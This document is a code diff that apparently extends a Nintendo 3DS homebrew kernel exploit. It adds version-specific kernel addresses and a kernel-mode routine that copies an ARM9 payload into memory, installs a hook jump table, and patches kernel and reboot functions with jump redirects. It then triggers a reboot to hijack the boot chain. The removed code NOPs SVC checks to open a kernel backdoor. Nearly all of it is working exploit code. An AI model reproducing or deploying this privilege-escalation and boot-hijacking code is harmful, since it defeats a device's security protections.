@@ -7,15 +7,40 @@
 
 #include "utils.h"
 
-u32 patch_addr;
-u32 svc_patch_addr;
-
-bool patched_svc = false;
-
-u32 *backup;
-u32 *arm11_buffer;
-
 u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
+unsigned int patch_addr;
+unsigned int svc_patch_addr;
+unsigned int reboot_patch_addr;
+unsigned int trigger_func_addr;
+unsigned int jump_table_addr;
+unsigned int jump_table_phys_addr = 0x1FFF4C80;
+unsigned int func_patch_addr;
+unsigned int func_patch_return;
+unsigned int fcram_addr;
+unsigned int pdn_regs;
+unsigned int pxi_regs;
+unsigned char patched_svc = 0;
+unsigned int kversion;
+
+unsigned char *framebuff_top_0;
+unsigned char *framebuff_top_1;
+
+u8 isN3DS = 0;
+u8 backupHeap = 0;
+u32 *backup;
+
+unsigned int *arm11_buffer;
+unsigned int *arm9_payload;
+unsigned int arm9_payload_size;
+extern void* jump_table asm("jump_table");
+extern void* pdn_regs_0 asm("pdn_regs_0");
+extern void* pxi_regs_0 asm("pxi_regs_0");
+extern void* return_location asm("return_location");
+extern void* reboot_wait asm("reboot_wait");
+extern void* end_jump_table asm("end_jump_table");
+extern void InvalidateEntireInstructionCache();
+extern void InvalidateEntireDataCache();
+extern void memcpy_asm(void *dest, const void *src, size_t n);
 
 // Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
@@ -57,65 +82,142 @@ void build_nop_slide(u32* dst, unsigned int len)
 int get_version_specific_addresses()
 {
 	// get proper patch address for our kernel -- thanks yifanlu once again
-	u32 kversion = *(vu32*)0x1FF80000; // KERNEL_VERSION register
+	kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
 
 	patch_addr = 0;
 	svc_patch_addr = 0;
 
-	u8 isN3DS = 0;
 	APT_CheckNew3DS(NULL, &isN3DS);
+	isN3DS = isN3DS && kversion >= 0x022C0600;
 
-	if(!isN3DS || kversion < 0x022C0600)
+	jump_table_phys_addr = 0x1FFF4C80;
+
+	if(!isN3DS)
 	{
-		switch (kversion)
+		if (kversion == 0x02220000) // 2.34-0 4.1.0
 		{
-			case 0x02220000: // 2.34-0 4.1.0
-				patch_addr = 0xEFF83C97;
-				svc_patch_addr = 0xEFF827CC;
-				break;
-			case 0x02230600: // 2.35-6 5.0.0
-				patch_addr = 0xEFF8372F;
-				svc_patch_addr = 0xEFF822A8;
-				break;
-			case 0x02240000: // 2.36-0 5.1.0
-			case 0x02250000: // 2.37-0 6.0.0
-			case 0x02260000: // 2.38-0 6.1.0
-				patch_addr = 0xEFF8372B;
-				svc_patch_addr = 0xEFF822A4;
-				break;
-			case 0x02270400: // 2.39-4 7.0.0
-				patch_addr = 0xEFF8372F;
-				svc_patch_addr = 0xEFF822A8;
-				break;
-			case 0x02280000: // 2.40-0 7.2.0
-				patch_addr = 0xEFF8372B;
-				svc_patch_addr = 0xEFF822A4;
-				break;
-			case 0x022C0600: // 2.44-6 8.0.0
-				patch_addr = 0xDFF83767;
-				svc_patch_addr = 0xDFF82294;
-				break;
-			case 0x022E0000: // 2.26-0 9.0.0
-				patch_addr = 0xDFF83837;
-				svc_patch_addr = 0xDFF82290;
-				break;
-			default:
-				dbg_log("Unrecognized kernel version 0x%08X, returning...\n", kversion);
-				return 0;
+			patch_addr = 0xEFF83C97;
+			svc_patch_addr = 0xEFF827CC;
+			reboot_patch_addr = 0xEFFF497C;
+			trigger_func_addr = 0xFFF748C4;
+			jump_table_addr = 0xEFFF4C80;
+			fcram_addr = 0xF0000000;
+			func_patch_addr = 0xEFFE4DD4;
+			func_patch_return = 0xFFF84DDC;
+			pdn_regs = 0xFFFD0000;
+			pxi_regs = 0xFFFD2000;
+		}
+		else if (kversion == 0x02230600) // 2.35-6 5.0.0
+		{
+			patch_addr = 0xEFF8372F;
+			svc_patch_addr = 0xEFF822A8;
+			reboot_patch_addr = 0xEFFF4978;
+			trigger_func_addr = 0xFFF64B94;
+			jump_table_addr = 0xEFFF4C80;
+			fcram_addr = 0xF0000000;
+			func_patch_addr = 0xEFFE55BC;
+			func_patch_return = 0xFFF765C4;
+			pdn_regs = 0xFFFD0000;
+			pxi_regs = 0xFFFD2000;
+		}
+		else if (kversion == 0x02240000 || kversion == 0x02250000 || kversion == 0x02260000) // 2.36-0 5.1.0, 2.37-0 6.0.0, 2.38-0 6.1.0
+		{
+			patch_addr = 0xEFF8372B;
+			svc_patch_addr = 0xEFF822A4;
+			reboot_patch_addr = 0xEFFF4978;
+			if(kversion == 0x02240000) //5.1
+			{
+				trigger_func_addr = 0xFFF64B90;
+				func_patch_addr = 0xEFFE55B8;
+				func_patch_return = 0xFFF765C0;
+				pdn_regs = 0xFFFD0000;
+				pxi_regs = 0xFFFD2000;
+			}
+			else
+			{
+				trigger_func_addr = 0xFFF64A78;
+				func_patch_addr = 0xEFFE5AE8;
+				func_patch_return = 0xFFF76AF0;
+				pdn_regs = 0xFFFD0000;
+				pxi_regs = 0xFFFD2000;
+			}
+			jump_table_addr = 0xEFFF4C80;
+			fcram_addr = 0xF0000000;
+		}
+		else if (kversion == 0x02270400) // 2.39-4 7.0.0
+		{
+			patch_addr = 0xEFF8372F;
+			svc_patch_addr = 0xEFF822A8;
+			reboot_patch_addr = 0xEFFF4978;
+			trigger_func_addr = 0xFFF64AB0;
+			jump_table_addr = 0xEFFF4C80;
+			fcram_addr = 0xF0000000;
+			func_patch_addr = 0xEFFE5B34;
+			func_patch_return = 0xFFF76B3C;
+			pdn_regs = 0xFFFD0000;
+			pxi_regs = 0xFFFD2000;
+		}
+		else if (kversion == 0x02280000) // 2.40-0 7.2.0
+		{
+			patch_addr = 0xEFF8372B;
+			svc_patch_addr = 0xEFF822A4;
+			reboot_patch_addr = 0xEFFF4974;
+			trigger_func_addr = 0xFFF54BAC;
+			jump_table_addr = 0xEFFF4C80;
+			fcram_addr = 0xF0000000;
+			func_patch_addr = 0xEFFE5B30;
+			func_patch_return = 0xFFF76B38;
+			pdn_regs = 0xFFFD0000;
+			pxi_regs = 0xFFFD2000;
+		}
+		else if (kversion == 0x022C0600) // 2.44-6 8.0.0
+		{
+			patch_addr = 0xDFF83767;
+			svc_patch_addr = 0xDFF82294;
+			reboot_patch_addr = 0xDFFF4974;
+			trigger_func_addr = 0xFFF54BAC;
+			jump_table_addr = 0xDFFF4C80;
+			fcram_addr = 0xE0000000;
+			func_patch_addr = 0xDFFE4F28;
+			func_patch_return = 0xFFF66F30;
+			pdn_regs = 0xFFFBE000;
+			pxi_regs = 0xFFFC0000;
+		}
+		else if (kversion == 0x022E0000) // 2.26-0 9.0.0
+		{
+			patch_addr = 0xDFF83837;
+			svc_patch_addr = 0xDFF82290;
+			reboot_patch_addr = 0xEFFF4974;
+			trigger_func_addr = 0xFFF151C0;
+			jump_table_addr = 0xDFFF4C80;
+			fcram_addr = 0xE0000000;
+			func_patch_addr = 0xDFFE59D0;
+			func_patch_return = 0xFFF279D8;
+			pdn_regs = 0xFFFC2000;
+			pxi_regs = 0xFFFC4000;
+		}
+		else
+		{
+#ifdef DEBUG_PROCESS
+			printf("Unrecognized kernel version %x, returning...\n", kversion);
+#endif
+			return 0;
 		}
 	}
 	else
 	{
-		switch (kversion)
+		if (kversion == 0x022C0600 || kversion == 0x022E0000) // N3DS 2.44-6 8.0.0, N3DS 2.26-0 9.0.0
 		{
-			case 0x022C0600: // N3DS 2.44-6 8.0.0
-			case 0x022E0000: // N3DS 2.26-0 9.0.0
-				patch_addr = 0xDFF8382F;
-				svc_patch_addr = 0xDFF82260;
-				break;
-			default:
-				dbg_log("Unrecognized kernel version 0x%08X, returning...\n", kversion);
-				return 0;
+			patch_addr = 0xDFF8382F;
+			svc_patch_addr = 0xDFF82260;
+			printf("Insufficient information for ARM9, returning... %i\n", kversion);
+		}
+		else
+		{
+#ifdef DEBUG_PROCESS
+			printf("Unrecognized kernel version %x, returning... %i\n", kversion);
+#endif
+			return 0;
 		}
 	}
 
@@ -186,26 +288,84 @@ void test(void)
 	arm11_buffer[0] = 0xFAAFFAAF;
 }
 
+//Tells us exactly where we are in firmlaunch hax and where we fail, without using printf
+int dotNum = 0;
+void dot()
+{
+	framebuff_top_0[dotNum] = 0xFF;
+	framebuff_top_1[dotNum] = 0xFF;
+	dotNum += 6;
+}
+
 int __attribute__((naked))
-arm11_patch_kernel(void)
+arm11_firmlaunch_hax(void)
 {
 	asm volatile ("add sp, sp, #8 \t\n");
+	asm volatile ("clrex");
 
-	arm11_buffer[0] = 0xF00FF00F;
+	dot();
 
-	// fix up memory
-	*(vu32*)(patch_addr + 8) = 0x8DD00CE5;
-
-	// give us access to all SVCs (including 0x7B, so we can return to kernel mode)
-	if (svc_patch_addr > 0)
-	{
-		*(vu32*)(svc_patch_addr) = 0xE320F000; // NOP
-		*(vu32*)(svc_patch_addr + 8) = 0xE320F000; // NOP
-		patched_svc = true;
-	}
+     arm11_buffer[0] = 0xFA0FFA0F;
+	int (*trigger_func)(int, int, int, int) = trigger_func_addr;
+	dot();
 
 	InvalidateEntireInstructionCache();
+	framebuff_top_0[7] = 0xFF;
+	framebuff_top_1[7] = 0xFF;
 	InvalidateEntireDataCache();
+
+	dot();
+	InvalidateEntireDataCache();
+
+	// ARM9 code copied to FCRAM 0x23F00000
+	memcpy_asm(fcram_addr + 0x3F00000, arm9_payload, arm9_payload_size);
+
+	dot();
+	InvalidateEntireDataCache();
+
+	// write function hook at 0xFFFF0C80
+	memcpy_asm(jump_table_addr, &jump_table, (&end_jump_table - &jump_table + 1) * 4);
+	//printf("%x = %x\n", jump_table_addr, *(u32*)jump_table_addr);
+
+	dot();
+	InvalidateEntireDataCache();
+
+	// write FW specific offsets to copied code buffer
+	//printf("%x = %x\n", jump_table_addr + 0x68, *(u32*)(jump_table_addr + 0x68));
+	*(int *)(jump_table_addr + (&pdn_regs_0 - &jump_table)*4) = pdn_regs; // PDN regs
+	*(int *)(jump_table_addr + (&pxi_regs_0 - &jump_table)*4) = pxi_regs; // PXI regs
+	*(int *)(jump_table_addr + (&return_location - &jump_table)*4) = func_patch_return; // where to return to from hook
+	//printf("%x = %x\n", jump_table_addr + 0x68, *(u32*)(jump_table_addr + 0x68));
+
+	dot();
+	InvalidateEntireDataCache();
+
+	// patch function 0xFFF84D90 to jump to our hook
+	*(int *)(func_patch_addr + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
+	*(int *)(func_patch_addr + 4) = 0xFFFF0C80; // jump_table + 0
+
+	dot();
+	InvalidateEntireDataCache();
+
+	// patch reboot start function to jump to our hook
+	*(int *)(reboot_patch_addr + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
+	*(int *)(reboot_patch_addr + 4) = 0x1FFF4C80 + (&reboot_wait - &jump_table)*4; // jump_table + 4
+
+	framebuff_top_0[42+1] = 0xFF;
+	framebuff_top_1[42+1] = 0xFF;
+	dotNum += 6;
+	InvalidateEntireDataCache();
+
+	InvalidateEntireInstructionCache();
+	framebuff_top_0[48+2] = 0xFF;
+	framebuff_top_1[48+2] = 0xFF;
+	dotNum += 6;
+
+	InvalidateEntireDataCache();
+	trigger_func(0, 0, 2, 0); // trigger reboot
+	while(1){}
+
+	return 0;
 
 	asm volatile ("movs r0, #0      \t\n"
 				  "ldr pc, [sp], #4 \t\n");
@@ -229,19 +389,20 @@ bool doARM11Hax()
 	for (i = 0; i < 0x1000/4; i++)
 		arm11_buffer[i] = 0xdeadbeef;
 
+	framebuff_top_0 = gfxGetFramebuffer(GFX_BOTTOM, GFX_LEFT, NULL, NULL);
+	gfxSwapBuffers();
+	framebuff_top_1 = gfxGetFramebuffer(GFX_BOTTOM, GFX_LEFT, NULL, NULL);
+	printf("Framebuffers at %x and %x\n", framebuff_top_0, framebuff_top_1);
+	printf("Jump table payload is 0x%x bytes long\n", (&end_jump_table - &jump_table + 1) * 4);
+	printf("Jump table vars 0x%x after jump table\n", (&pdn_regs_0 - &jump_table)*4);
+	printf("Reboot wait at %x\n", 0x1FFF4C80 + (&reboot_wait - &jump_table)*4);
+
 	if (arm11_kernel_exploit_setup())
 	{
 		dbg_log("Kernel exploit set up\n");
 
-		arm11_kernel_exploit_exec(arm11_patch_kernel);
-		dbg_log("ARM11 Kernel code executed\n");
-
-		if (patched_svc)
-		{
-			dbg_log("Testing SVC 0x7B\n");
-			svcBackdoor(test);
-            return true;
-		}
+		arm11_kernel_exploit_exec(arm11_firmlaunch_hax);
+		dbg_log("ARM11 code passed somehow, ARM9 failed...\n");
 	}
 
     dbg_log("Kernel exploit set up failed!\n\n");
